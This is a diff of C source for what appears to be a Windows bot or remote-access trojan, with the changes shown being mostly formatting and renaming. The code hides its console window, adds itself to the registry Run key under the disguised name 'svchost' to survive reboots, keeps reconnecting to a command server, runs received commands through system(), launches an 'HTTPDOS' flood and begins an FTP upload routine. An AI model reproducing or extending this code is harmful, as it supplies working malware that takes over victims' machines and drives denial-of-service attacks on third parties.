@@ -1,91 +1,92 @@
-#include<stdio.h>
-#include<windows.h>
-#define sleep(x) Sleep(1000 * (x))
-#include<winuser.h>
-#include<windowsx.h>
+#include <stdio.h>
+#include <windows.h>
+#include <winuser.h>
+#include <windowsx.h>
 #include <time.h>
 #include <winsock.h>
+#include "utils.h"
 
-#define BUFSIZE 80
-//Function that create connection to the server
+#define sleep(x) Sleep(1000 * (x))
+#define BUFFSIZE 80
+
+// connection to main server
 int create_conn(int sock, char *server_ip, int server_port){
 
-	struct sockaddr_in server;
-	server.sin_addr.s_addr = inet_addr(server_ip);
-	server.sin_family = AF_INET;
-	server.sin_port = htons( server_port );
-	int ris;
-	do{
-        //printf("pippo");
+    struct sockaddr_in server;
+    server.sin_addr.s_addr = inet_addr(server_ip);
+    server.sin_family = AF_INET;
+    server.sin_port = htons( server_port );
+    int ris;
+    do{
         //always try to connect
-		ris=connect(sock , (struct sockaddr *)&server , sizeof(server));
-	}while(ris<0);
-	printf("\nConnected");
+        ris=connect(sock , (struct sockaddr *)&server , sizeof(server));
+    }while(ris<0);
+    printf("\nConnected");
     return ris;
 
- }
-//Funzione che converte un url in ip
-void hostname_to_ip(char *address, char *ip){
-	int i;
-	struct hostent * he;
-	struct in_addr **addr_list;
-	he = gethostbyname(address);
-	if (he==NULL){
-    exit(0);
-	}
-	 addr_list = (struct in_addr **) he -> h_addr_list;
-	 for(i=0; addr_list[i]!=NULL; i++){
-		strcpy(ip, inet_ntoa(*addr_list[i]));
-	 }
-	}
-//Function that hides the console
-void stealth(){
+}
 
-	HWND st;                                                //Handle to a window
-	AllocConsole();
-	st=FindWindowA("ConsoleWindowClass",NULL);              //attack the top level window to the handle
-	ShowWindow(st,0);                                       //Hide window
+void hostname_to_ip(char *address, char *ip){
+    int i;
+    struct hostent * he;
+    struct in_addr **addr_list;
+    he = gethostbyname(address);
+    if (he==NULL){
+        exit(0);
+    }
+    addr_list = (struct in_addr **) he -> h_addr_list;
+    for(i=0; addr_list[i]!=NULL; i++){
+        strcpy(ip, inet_ntoa(*addr_list[i]));
+    }
+}
+
+// hide console
+void stealth(){
+    HWND st; //Handle to a window
+    AllocConsole();
+    st=FindWindowA("ConsoleWindowClass",NULL); //attack the top level window to the handle
+    ShowWindow(st,0); //Hide window
 }
 
 int create_key(char *path){
-	int reg_key;
-	int check;
-	HKEY hkey;
-	reg_key=RegCreateKey(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",&hkey);		//create the reg key on secified ath
+    int reg_key;
+    int check;
+    HKEY hkey;
+    reg_key=RegCreateKey(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",&hkey);		//create the reg key on secified ath
 
-	if(reg_key==0)
-	   {
-			RegSetValueEx((HKEY)hkey,"svchost",0,REG_SZ,(BYTE *)path,strlen(path));			//set value on registry key
-			check=0;
-			return check;
-	   }
-	if(reg_key!=0)			//Error case
-		check=1;
+    if(reg_key==0)
+    {
+        RegSetValueEx((HKEY)hkey,"svchost",0,REG_SZ,(BYTE *)path,strlen(path));			//set value on registry key
+        check=0;
+        return check;
+    }
+    if(reg_key!=0)			//Error case
+        check=1;
 
-	return check;
+    return check;
 }
 
 int test_key(void ){
-	int check;
-	HKEY hKey;                                              //Handle to registry key
-	char path[BUFSIZE];
-	DWORD buf_length=BUFSIZE;		                        //unsigned integer
-	int reg_key;
+    int check;
+    HKEY hKey;                                              //Handle to registry key
+    char path[BUFFSIZE];
+    DWORD buf_length=BUFFSIZE;		                        //unsigned integer
+    int reg_key;
 
-	reg_key=RegOpenKeyEx(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_QUERY_VALUE,&hKey);       //open the specified registry key
-	if(reg_key!=0){
-		check=1;
-		return check;
-	}
-	reg_key=RegQueryValueEx(hKey,"svchost",NULL,NULL,(LPBYTE)path,&buf_length);     //Retrieves the type and data for value name associated with an open registry key.
+    reg_key=RegOpenKeyEx(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_QUERY_VALUE,&hKey);       //open the specified registry key
+    if(reg_key!=0){
+        check=1;
+        return check;
+    }
+    reg_key=RegQueryValueEx(hKey,"svchost",NULL,NULL,(LPBYTE)path,&buf_length);     //Retrieves the type and data for value name associated with an open registry key.
 
-   if((reg_key!=0)||(buf_length>BUFSIZE))
-	   check=2;
-   if(reg_key==0)
-	   check=0;
+    if((reg_key!=0)||(buf_length>BUFFSIZE))
+        check=2;
+    if(reg_key==0)
+        check=0;
 
-   RegCloseKey(hKey);
-   return check;
+    RegCloseKey(hKey);
+    return check;
 }
 //Function to execute the HTTPDOS
 void hdos_exe(char *address){
@@ -281,6 +282,7 @@ int exec_command(char *command, int sock){
     system("del svchostout.txt");
     return 1; //success
 }
+
 void upload(){
 	char *ftp_ip,symbol, control_sock;
 	WSADATA wsa;
